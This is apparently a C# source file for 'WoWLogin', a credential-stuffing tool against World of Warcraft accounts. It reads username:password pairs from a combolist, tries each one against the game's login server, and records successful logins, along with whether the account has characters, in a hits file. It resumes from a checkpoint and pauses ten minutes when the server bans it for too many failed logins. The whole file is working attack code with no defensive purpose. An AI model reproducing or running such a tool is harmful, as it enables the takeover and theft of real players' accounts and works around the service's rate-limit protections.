using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program
{
    static void Main(string[] args)
    {
        Console.Title = "WoWLogin";
        UInt64 checkpoint = 0;
        UInt64 counter = 0;
        new Thread(() =>
        {
            while (true)
            {
                Thread.Sleep(40);
                DrawChar('-');
                Thread.Sleep(40);
                DrawChar('\\');
                Thread.Sleep(40);
                DrawChar('|');
                Thread.Sleep(40);
                DrawChar('/');
            }
        }).Start();
            

        FileStream fileStream = new FileStream(@"combolist.txt", FileMode.Open, FileAccess.Read);
        StreamReader sr = new StreamReader(fileStream);
        using (StreamWriter sw = new StreamWriter(@"hits.txt", true))
            sw.WriteLine("\n--[{0} - {1}]--", DateTime.Now.ToLongDateString() , DateTime.Now.ToLongTimeString());

        try
        {
            using (StreamReader sr2 = new StreamReader(@"checkpoint.txt"))
                checkpoint = Convert.ToUInt64(sr2.ReadLine());
        }
        catch { }

        Console.WriteLine("\n\n\nBrute started");
        while (!sr.EndOfStream)
        {
                counter++;
                using (StreamWriter sw = new StreamWriter(@"checkpoint.txt", false))
                    sw.Write(counter.ToString());
                string temp = sr.ReadLine();
                if (counter < checkpoint) continue;
                string username = temp.Remove(temp.IndexOf(':'));
                string password = temp.Remove(0, temp.IndexOf(':') + 1);
                Console.Write("\r" + new string(' ', Console.BufferWidth - Console.CursorLeft) + "\rChecking: {0}", username);
                try
                {
                    if (Login(username, password))
                    {
                        Console.Write("\r" + new string(' ', Console.BufferWidth - Console.CursorLeft) + "\rHit on - {0}:{1}", username, password);
                        using (StreamWriter sw = new StreamWriter(@"hits.txt", true))
                            sw.WriteLine(username + ":" + password);
                    }
                }
                catch (BanException ex)
                {

                    Console.Title = "WoWLogin - On pause due to a bad logins ban";
                    Thread.Sleep(10 * 60 * 1000 + 50);
                    Console.Title = "WoWLogin";
                }
                catch { }
        }
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("\n\nDone\a\a\a");
        sr.Close();
        Console.Read();
    }

    static bool Login(string username, string password)
    {
        Logon l = new Logon(username, password);
        SocketStreamer socket = new SocketStreamer(WoWLogin.Properties.Settings.Default.LoginServer);
        Packet p = l.DoLogonChallenge();
        p = socket.SendPacket(p);
        if (l.HandleLogonChallenge(p))
        {
            p = l.DoLogonProof();
            p = socket.SendPacket(p);
            try
            {
                if (l.HandleLogonProof(p) != false)
                {
                    p = l.SendRealmlistRequest();
                    p = socket.SendPacket(p);
                    Realm[] realms = l.RetrieveRealmList(p);
                    foreach (Realm r in realms)
                        if (r.NumChars > 0)
                        {
                            socket.Dispose();
                            return true;
                        }
                }
            }
            catch (BanException ex)
            {
                socket.Dispose();
                throw new BanException();
            }
            catch
            { }
        }
        socket.Dispose();
        return false;

    }

    static void DrawChar(char c)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        int cW = Console.WindowWidth;
        int left = Console.CursorLeft;
        int top = Console.CursorTop;
        Console.SetCursorPosition(1, 1);
        Console.Write("\r" + new string(' ', Console.BufferWidth - Console.CursorLeft)+"\r ");
        Console.Write(c);
        Console.ForegroundColor = ConsoleColor.White;
        Console.SetCursorPosition(left, top);
    }
}